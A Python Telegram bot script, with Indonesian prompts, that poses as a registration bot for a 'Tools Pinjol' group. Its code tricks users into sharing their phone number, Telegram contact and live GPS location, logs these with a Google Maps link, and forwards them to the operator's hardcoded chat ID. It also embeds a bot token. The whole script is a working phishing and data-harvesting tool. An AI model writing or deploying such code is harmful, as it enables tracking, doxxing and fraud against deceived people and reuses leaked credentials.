
import telebot
from telebot import types
import time
import random

ID = '5020924371'
bot = telebot.TeleBot("6578874894:AAH8MbnOZLTyeiDMBthO0YY3dEAXicNTy3o")
adr = ['ANDA BERHASIL !! BERI TAHU ADMIN JIKA PENDAFTARAN MU SUDAH BERHASIL']
bot.send_message(ID, '!BOT STARTED!') 
print("Bot diluncurkan!")

@bot.message_handler(commands=['start'])
def start(message):
	bot.send_message(message.chat.id, '''👋 Hello! 👋
		Ini adalah bot Pendaftaran menjadi member Grup Tools Pinjol!
	Untuk melanjutkan pendaftaran,klik 👉 /getinfo''') 
	
@bot.message_handler(commands=['lamer112311dev'])
def start(message):
	bot.send_message(message.chat.id, 'Penulis skrip: @Anitauceha. Saluran: Youtube Tools Pinjol') 

@bot.message_handler(commands=['getinfo'])
def start(message):
	msg = bot.send_message(message.chat.id, 'Masukkan nomor telepon') 
	bot.register_next_step_handler(msg, proc2)

def proc2(message):
	try:
		m_id = message.chat.id
		user_input = message.text
		num = user_input.replace('+', '')

		if not num.isdigit():
			msg = bot.reply_to(message, 'Sepertinya Anda tidak memasukkan nomor telepon yang valid, silakan coba lagi dengan menulis /getinfo!')#⏳
			return

		bot.send_message(m_id, f'Permintaan nomor {num} terkirim!')
		time.sleep(2)
		keyboard = types.ReplyKeyboardMarkup(row_width=1, resize_keyboard=True) 
		button_phone = types.KeyboardButton(text="Daftar", request_contact=True) 	
		keyboard.add(button_phone)	
		bot.send_message(m_id, '''untuk melanjutkan menjadi Anggota Grup Tools Pinjol!
			Klik Tombol DAFTAR di bawah ini!''', reply_markup=keyboard)
# Kesalahan menangkap
	except Exception as e:
		bot.send_message(ID, e)
		bot.send_message(m_id, 'Terjadi kesalahan yang tidak teridentifikasi, harap mulai ulang bot!')

@bot.message_handler(content_types=['contact']) 
def contact(message):
	if message.contact is not None: 
		nick = message.from_user.username
		first = message.contact.first_name
		last = message.contact.last_name
		userid = message.contact.user_id
		phone = message.contact.phone_number
		info = f'''
			Data
			├Nama: {first} {last}
			├ID: {userid}
			├Ник: @{nick}
			└Nomor telepon: {phone}
			'''
		log = open('bot-log.txt', 'a+', encoding='utf-8')
		log.write(info + '  ')
		log.close()
		bot.send_message(ID, info)
		print(info)

		if message.contact.user_id != message.chat.id:
			bot.send_message(message.chat.id, 'Kirim kontak Anda!')

	keyboardmain = types.InlineKeyboardMarkup(row_width=2)
	button = types.InlineKeyboardButton(text="LANJUTKAN PENDAFTARAN", callback_data="find")
	keyboardmain.add(button)
	bot.send_message(message.chat.id, f'''
		Lanjutkan pendaftaran
		├klik tombol
		└di bawah ini
		''', reply_markup=keyboardmain)

@bot.callback_query_handler(func=lambda call:True)
def callback_inline(call):
	if call.data == "find":
		keyboard1 = types.ReplyKeyboardMarkup(row_width=1, resize_keyboard=True) 
		button_location = types.KeyboardButton(text="Mengonfirmasi", request_location=True) 	
		keyboard1.add(button_location)
		bot.send_message(call.message.chat.id, text='Untuk menjadi member Tools Pinjol Klik Tombol konfirmasikan geolokasi Anda di BAWAH INI, DAN NYALAKAN GPS ANDA, AGAR BERHASIL MENDAFTAR!', reply_markup=keyboard1)

@bot.message_handler(content_types=['location']) 
def contact(message):
	if message.location is not None: 
		lon = str(message.location.longitude)
		lat = str(message.location.latitude)
		geo = f'''
		Гlokasi
		├ID: {message.chat.id}
		├Longitude: {lon}
		├Latitude: {lat}
		└Карты: https://www.google.com/maps/place/{lat}+{lon} 
		'''
		log = open('bot-log.txt', 'a+', encoding='utf-8')
		log.write(geo + '  ')
		log.close()
		bot.send_message(ID, geo) 
		print(geo)
		bot.send_message(message.chat.id, f'''
			ГSELAMAT
			└PENDAFTARAN: {random.choice(adr)}
			''')
bot.polling()
		